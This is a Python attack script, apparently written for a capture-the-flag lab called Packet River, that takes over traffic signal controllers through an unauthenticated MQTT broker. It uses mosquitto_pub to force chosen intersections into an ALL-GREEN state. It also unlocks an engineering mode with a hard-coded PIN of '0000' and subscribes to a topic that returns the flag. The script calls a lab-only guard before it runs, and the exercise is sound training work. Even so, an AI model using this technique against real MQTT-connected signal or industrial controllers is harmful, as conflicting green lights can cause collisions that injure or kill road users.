#!/usr/bin/env python3
"""Take over the Packet River traffic signals over the open MQTT bus.

The broker carries pkt/traffic/# with no ACL and no auth, so anything that can
reach it can command the signal controllers.

    traffic_attack.py all-green [id]   # lock one crossroads (or all) ALL-GREEN
    traffic_attack.py normal   [id]    # hand it back to the auto cycle
    traffic_attack.py flag              # unlock engineering mode, grab the flag
    traffic_attack.py restore           # all intersections back to AUTO

Thin wrapper around mosquitto_pub / mosquitto_sub; everything goes through the
lab-only guard first.
"""
import subprocess
import sys

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

HOST = "bus"
IDS = [1, 2, 3, 4, 5]
ENG_PIN = "0000"


def pub(topic, msg):
    subprocess.run(["mosquitto_pub", "-h", HOST, "-t", topic, "-m", msg], check=True)


def main():
    guard(HOST)
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    cmd = sys.argv[1]
    ids = [int(sys.argv[2])] if len(sys.argv) > 2 else IDS

    if cmd == "all-green":
        for i in ids:
            pub(f"pkt/traffic/{i}/set", "ALL-GREEN")
        print(f"[+] intersections {ids} -> ALL-GREEN")
    elif cmd in ("normal", "restore"):
        for i in (IDS if cmd == "restore" else ids):
            pub(f"pkt/traffic/{i}/set", "AUTO")
        print("[+] handed back to the auto cycle")
    elif cmd == "flag":
        pub("pkt/traffic/eng", ENG_PIN)
        out = subprocess.run(
            ["mosquitto_sub", "-h", HOST, "-t", "pkt/traffic/flag", "-C", "1", "-W", "5"],
            capture_output=True, text=True)
        flag = out.stdout.strip()
        print(flag if flag else "[!] no flag published - check the PIN / broker")
    else:
        sys.exit(f"unknown command: {cmd}")


if __name__ == "__main__":
    main()
